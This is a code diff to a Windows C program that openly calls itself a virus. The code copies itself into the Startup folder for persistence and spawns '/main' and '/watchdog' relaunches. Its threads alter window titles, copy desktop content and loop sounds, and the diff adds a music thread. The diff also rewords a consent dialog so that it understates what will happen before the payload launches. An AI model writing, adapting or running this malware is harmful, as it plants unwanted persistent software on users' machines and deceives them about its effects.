@@ -10,8 +10,9 @@
 #include <shlobj.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <mmsystem.h>
 #pragma comment(lib, "winmm.lib")
-
+//#include "resource.h"
 
 HINSTANCE g_hThisInstance;
 
@@ -34,6 +35,9 @@ void ExecuteFromStartup(LPCWSTR arg);
 void* Thread_title_change(void* args);
 void* Thread_copy_alldesktop(void* args);
 void* Thread_copy_somepart(void* args);
+void* Thread_play_music(void* args);
+
+void MIDIPlay(unsigned char* data, unsigned int size);
 
 int WINAPI WinMain (HINSTANCE hThisInstance,
                      HINSTANCE hPrevInstance,
@@ -43,43 +47,50 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
     LPWSTR* args = NULL;
     int argc = 0;
     Init();
-    BOOL copyf = CopySelf();
 
     args = CommandLineToArgvW(GetCommandLineW(), &argc);
 
     if ((argc > 1) && (IsInStartupPath() == TRUE))
     {
-        if (lstrcmpW(args[1], L"/main") != 0)
+        if (lstrcmpW(args[1], L"/main") == 0)
+        {
+            pthread_t pht[4];
+            Sleep(20000);
+            for (int i = 0; i < 5; i++)
+            {
+                if (i == 1) {
+                    pthread_create(&pht[0], NULL, Thread_play_music, NULL);
+                }
+                if (i == 2) {
+                    pthread_create(&pht[1], NULL, Thread_title_change, NULL);
+                    pthread_create(&pht[2], NULL, Thread_copy_somepart, NULL);
+                }
+                ExecuteFromStartup(L"/watchdog");
+                Sleep(20000);
+            }
+            pthread_create(&pht[3], NULL, Thread_copy_alldesktop, NULL);
+            pthread_exit(NULL);
+        }
+        if (lstrcmpW(args[1], L"/watchdog") != 0)
         {
             ExecuteFromStartup(NULL);
             return 0;
         }
         LocalFree(args);
         StartVirus();
-    } else if (copyf == TRUE) {
+    } else if (CopySelf() == TRUE) {
         LocalFree(args);
-        pthread_t pht[3];
         PlaySoundA("SystemExclamation", NULL, SND_ASYNC);
         if (MessageBoxA(NULL, "Hi! \nThis is a SoftWare Execute. ", "Startup", MB_OKCANCEL) == IDCANCEL) {
             return 0;
         }
         PlaySoundA("SystemExclamation", NULL, SND_ASYNC);
-        if (MessageBoxA(NULL, "We are now prepare to show you some icons on your desktop. \nAre you okay? ", "Get Ready", MB_OKCANCEL) == IDCANCEL) {
+        if (MessageBoxA(NULL, "We are now prepare to show a message box. \nAre you okay? ", "Get Ready", MB_OKCANCEL) == IDCANCEL) {
             return 0;
         }
-
-        Sleep(20000);
-        for (int i = 0; i < 5; i++)
-        {
-            if (i == 2) {
-                pthread_create(&pht[0], NULL, Thread_title_change, NULL);
-                pthread_create(&pht[1], NULL, Thread_copy_somepart, NULL);
-            }
-            ExecuteFromStartup(L"/main");
-            Sleep(20000);
-        }
-        pthread_create(&pht[2], NULL, Thread_copy_alldesktop, NULL);
-        pthread_exit(NULL);
+        Sleep(1000);
+        ExecuteFromStartup(L"/main");
+        MessageBoxA(NULL, "Okay! \nNow we finish the task, you can press Yes(Y) to quit. ", "Quit", MB_OK);
         exit(0);
     }
 
@@ -269,6 +280,26 @@ void* Thread_copy_somepart(void* args)
     }
 }
 
+void* Thread_play_music(void* args)
+{
+    LPCSTR sound;
+    while (1) {
+        switch (rand() % 3)
+        {
+        case 0:
+            sound = "WAVE_CAT";
+            break;
+        case 1:
+            sound = "WARE_ROPE";
+            break;
+        case 2:
+            sound = "WARE_NOS";
+        }
+        PlaySoundA(sound, NULL, SND_RESOURCE|SND_SYNC);
+        Sleep(10000);
+    }
+}
+
 void StartVirus()
 {
     pthread_t pht[6];
@@ -324,4 +355,3 @@ void Init()
     GetModuleFileNameW(g_hThisInstance, g_szAppPath, 100);
     SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, NULL, g_szStartupPath);
 }
-
